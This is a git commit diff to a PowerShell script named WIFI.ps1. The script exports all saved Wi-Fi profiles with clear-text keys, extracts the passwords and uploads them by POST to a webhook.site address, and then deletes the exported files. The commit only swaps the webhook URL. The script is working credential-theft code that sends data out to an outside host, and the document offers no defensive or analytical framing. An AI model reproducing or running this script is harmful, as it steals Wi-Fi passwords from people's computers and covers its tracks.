6df675aec9405a8ced6a7d1b3fd5b3603ba107d6
guilherme-luc <152202121+guilherme-luc@users.noreply.github.com>
2025-02-13 13:36:07 -0300

    Update WIFI.ps1

--- WIFI.ps1
+++ WIFI.ps1
@@ -5,7 +5,7 @@ net start wlansvc
 $env:TEMP
 netsh wlan export profile key=clear
 powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
-Invoke-WebRequest -Uri "https://webhook.site/35192f97-171d-428f-b03e-33726a40cde1" -Method POST -InFile Wi-Fi-PASS
+Invoke-WebRequest -Uri "https://webhook.site/8e9eb21c-ee6a-4888-b509-c5e379b69a90" -Method POST -InFile Wi-Fi-PASS
 Remove-Item Wi-* -Force -Recurse
 Set-WinUserLanguageList pt-BR -Force
 exit
